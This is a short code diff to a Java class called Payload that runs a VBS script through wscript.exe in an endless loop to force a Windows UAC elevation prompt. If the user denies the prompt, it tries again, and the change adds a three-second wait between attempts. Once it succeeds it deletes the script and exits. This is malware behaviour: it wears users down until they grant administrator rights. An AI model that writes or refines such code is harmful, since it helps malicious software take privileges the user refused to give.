@@ -164,7 +164,6 @@ public class Payload {
             while (true) {
                 log("Triggering UAC...");
                 
-                // Execute VBS (wscript is instant)
                 Process p = new ProcessBuilder("wscript.exe", vbsFile.getAbsolutePath()).start();
                 p.waitFor(); 
                 
@@ -184,7 +183,9 @@ public class Payload {
                     vbsFile.delete();
                     System.exit(0); 
                 } else {
-                    log("UAC Denied. Retrying instantly...");
+                    log("UAC Denied. Waiting 3s for Windows cooldown...");
+                    // Wait 3 seconds to let Windows lift the UAC lock
+                    Thread.sleep(3000);
                 }
             }
         } catch (Exception e) {
